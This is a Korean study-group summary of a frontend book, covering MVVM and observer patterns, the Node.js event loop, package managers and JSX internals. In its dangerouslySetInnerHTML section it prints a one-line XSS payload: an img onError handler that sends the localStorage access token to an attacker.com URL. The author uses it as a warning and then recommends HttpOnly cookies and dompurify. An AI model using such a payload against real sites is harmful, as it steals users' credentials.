## 이번 주 핵심 요약

### 4장 - 프론트엔드에서의 다양한 패턴들

- 리액트에서 너무 당연히 사용되는 UI 동기화 과정을 다양한 패턴(MVC, MVVM, 관찰자 등)을 통해 구현하고 있습니다.
- 저는 이전 회사에서 mobx를 활용하여 MVVM 패턴을 적용하여 프로젝트를 개발했던 경험이 있습니다. 당시 개발에 참고했던 링크를 드리는 게 해당 개념을 이해하는 데 도움이 될 것 같아 첨부드립니다.
- [관련 문서](https://techblog.woowahan.com/2599/) 첨부드립니다.

### 5장 - Node.js에 대한 설명

- Node.js에 대한 구조가 나옵니다. 이미 다들 아실 내용이지만 콜 스택, 이벤트 루프, 더 나아가 libuv 관련 내용까지 다루고 있습니다. 저는 클라이언트 개발자 관점에서 요약을 작성하겠습니다.
- 동기 함수의 경우 콜 스택에서 차례대로 pop 되며 실행됩니다.
- 비동기 함수의 경우 Web API에 의해 실행 준비를 마치고, 본인이 해당하는 큐(마이크로태스크 / 매크로태스크)에 들어가게 됩니다.
- 콜 스택이 비어있는 경우 이벤트 루프가 큐에 있는 태스크를 콜 스택으로 옮기는데, 여기서 우선순위는 마이크로태스크 큐 > 매크로태스크 큐 입니다. 콜 스택으로 옮겨진 태스크들은 이제 실행됩니다.

- 패키지 매니저는 npm, yarn classic, pnpm, yarn berry 등이 있습니다. npm의 경우 초기 버전에서 설치 속도 면에서 문제가 많았고, 이후에 시간이 지나며 yarn이 등장하여 병렬 설치를 지원하고, 의존성 평탄화를 지원하며 문제가 해결되는 듯 싶었습니다. 다만 유령 의존성 문제가 발생하여 직접 설치하지도 않은 라이브러리에 접근 가능한 문제가 발생하게 되었습니다.
- 이후 나온 패키지 매니저들의 경우 컨셉은 조금씩 다르지만 node_modules 안에 패키지를 설치하지 않거나, 캐싱을 활용하거나, symlink를 통해서 한 곳에서만 설치가 이뤄지게끔 하는 방식으로 기존에 발생한 속도 저하 및 디스크 용량 차지등의 문제를 해결했습니다. 다만 개념 자체를 완전히 바꾸다 보니 레거시 라이브러리들과의 호환 문제가 발생할 수 있다는 점이 주의사항입니다.

### 6장 - 구성 요소 돌아보기

- JSXElement가 JSXOpeningElement, JSXChildren, JSXClosingElement로 구성되어 있습니다.
- React 컴포넌트명을 왜 소문자로 작성하면 안 되는지에 대해 알게 되었습니다. 트랜스파일링이 되며 결국 자바스크립트 객체로 변환되는데, 소문자로 컴포넌트명을 적게 되면 리액트가 커스텀 컴포넌트인지 기본 태그인지 확인하기 어렵기 때문입니다. 물론, 이 부분은 기본적인 컨벤션이라 리액트 컴포넌트를 굳이 소문자로 작성하는 사람들은 거의 없을 것이라 생각합니다.
- React에서는 HTML 태그나 특수문자를 그대로 노출시키고 싶은 경우가 있습니다. 쉽게 말하면, `<p>안녕하세요</p>` 가 노출되는 것이 아닌, JSX 안에 그대로 들어가길 원하는 경우입니다. 이 경우는 dangerouslySetInnerHTML라는 메소드를 사용해서 적용시킬 수 있습니다. [여기를 참고](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)하시면 됩니다.
- 다만 이 부분은 주의점만 나와있는 것 같은데, 예시를 하나 들자면,

```
<img src="x" onError="fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'))
"/>
```

이런식으로 로컬스토리지에 토큰을 가지고 있다면 나도 모르게 탈취당할 수 있게 되는 것입니다. 좀 더 추가해서 말하자면, 로컬스토리지는 태생적으로 JS로 값을 가져올 수 있다는 취약점이 있기에, 보안이 필요한 데이터를 가지고 있는 것엔 적합하지 않다는 결론이 나옵니다. 보안을 위해서라면 HttpOnly와 같은 옵션이 있는 Cookie가 더 나을 것입니다.

- 결론을 내리자면, 해당 케이스에서는 dompurify와 같은 라이브리를 통해 위험한 이벤트 핸들러들을 제거해 주는 것이 좋습니다. 위 태그에서 onError가 제거될 것이고 더 이상 위험하지 않게 될 것입니다.
